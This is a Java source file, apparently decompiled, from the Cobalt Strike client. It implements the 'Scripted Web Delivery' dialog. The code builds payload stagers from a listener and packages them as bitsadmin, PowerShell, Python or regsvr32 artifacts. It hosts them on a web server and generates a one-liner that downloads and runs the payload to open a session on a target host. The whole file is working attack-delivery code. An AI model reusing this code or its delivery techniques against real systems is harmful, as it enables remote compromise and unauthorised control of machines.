package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import common.ArtifactUtils;
import common.Callback;
import common.CommonUtils;
import common.ListenerUtils;
import common.PowerShellUtils;
import common.ResourceUtils;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;

import java.awt.event.ActionEvent;
import java.io.IOException;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JFrame;

public class ScriptedWebDialog implements DialogListener, Callback {

    protected JFrame dialog = null;

    protected Map options = null;

    protected AggressorClient client = null;

    protected String proto;

    public ScriptedWebDialog(AggressorClient aggressorClient) {
        this.client = aggressorClient;
    }

    public void dialogAction(ActionEvent actionEvent, Map map) {
        this.options = map;
        String str1 = map.get("port") + "";
        String str2 = map.get("uri") + "";
        String str3 = map.get("host") + "";
        String str4 = DialogUtils.string(map, "type");
        boolean bool = DialogUtils.bool(map, "ssl");
        this.proto = bool ? "https://" : "http://";
        String str5 = map.get("output") + "";
        String str6 = map.get("listener") + "";
        byte[] arrby = ListenerUtils.getListener(this.client, str6).getPayloadStager("x86");
        if ("bitsadmin".equals(str4)) {
            byte[] arrby1 = (new ArtifactUtils(this.client)).patchArtifact(arrby, "artifact32.exe");
            this.client.getConnection().call("cloudstrike.host_data", CommonUtils.args(str3, Integer.valueOf(Integer.parseInt(str1)), Boolean.valueOf(bool), str2, CommonUtils.bString(arrby1), "application/octet-stream", "Scripted Web Delivery (bitsadmin)"), this);
        } else if ("powershell".equals(str4)) {
            byte[] arrby1 = (new ResourceUtils(this.client)).buildPowerShell(arrby);
            this.client.getConnection().call("cloudstrike.host_data", CommonUtils.args(str3, Integer.valueOf(Integer.parseInt(str1)), Boolean.valueOf(bool), str2, (new PowerShellUtils(this.client)).PowerShellCompress(arrby1), "text/plain", "Scripted Web Delivery (powershell)"), this);
        } else if ("python".equals(str4)) {
            byte[] arrby1 = ListenerUtils.getListener(this.client, str6).getPayloadStager("x64");
            byte[] arrby2 = (new ResourceUtils(this.client)).buildPython(arrby, arrby1);
            this.client.getConnection().call("cloudstrike.host_data", CommonUtils.args(str3, Integer.valueOf(Integer.parseInt(str1)), Boolean.valueOf(bool), str2, (new ResourceUtils(this.client)).PythonCompress(arrby2), "text/plain", "Scripted Web Delivery (python)"), this);
        } else if ("regsvr32".equals(str4)) {
            byte[] arrby1 = (new ArtifactUtils(this.client)).buildSCT(arrby);
            this.client.getConnection().call("cloudstrike.host_data", CommonUtils.args(str3, Integer.valueOf(Integer.parseInt(str1)), Boolean.valueOf(bool), str2, CommonUtils.bString(arrby1), "text/plain", "Scripted Web Delivery (regsvr32)"), this);
        } else {
            DialogUtils.showError("Unknown type: " + str4);
        }
    }

    public void result(String string, Object object) {
        String str1 = object + "";
        String str2 = this.options.get("port") + "";
        String str3 = this.options.get("uri") + "";
        String str4 = this.options.get("host") + "";
        String str5 = this.options.get("type") + "";
        if ("success".equals(str1)) {
            DialogUtils.startedWebService("Scripted Web Delivery", CommonUtils.OneLiner(this.proto + str4 + ":" + str2 + str3, str5));
        } else {
            DialogUtils.showError("Unable to start web server:\n" + str1);
        }
    }

    public void show() throws IOException {
        this.dialog = DialogUtils.dialog("Scripted Web Delivery", 640, 480);
        DialogManager dialogManager = new DialogManager(this.dialog);
        dialogManager.addDialogListener(this);
        dialogManager.set("uri", "/a");
        dialogManager.set("port", "80");
        dialogManager.set("host", DataUtils.getLocalIP(this.client.getData()));
        dialogManager.set("type", "powershell");
        dialogManager.text("uri", "URI Path:", 10);
        dialogManager.text("host", "Local Host:", 20);
        dialogManager.text("port", "Local Port:", 20);
        dialogManager.sc_listener_stagers("listener", "Listener:", this.client);
        dialogManager.combobox("type", "Type:", CommonUtils.toArray("bitsadmin, powershell, python, regsvr32"));
        dialogManager.checkbox_add("ssl", "SSL:", "Enable SSL", DataUtils.hasValidSSL(this.client.getData()));
        JButton jButton1 = dialogManager.action("Launch");
        JButton jButton2 = dialogManager.help("https://www.cobaltstrike.com/help-scripted-web-delivery");
        this.dialog.add(DialogUtils.description("This attack hosts an artifact that delivers a Cobalt Strike payload. The provided one-liner will allow you to quickly get a session on a target host."), "North");
        this.dialog.add(dialogManager.layout(), "Center");
        this.dialog.add(DialogUtils.center(jButton1, jButton2), "South");
        this.dialog.pack();
        this.dialog.setVisible(true);
    }
}
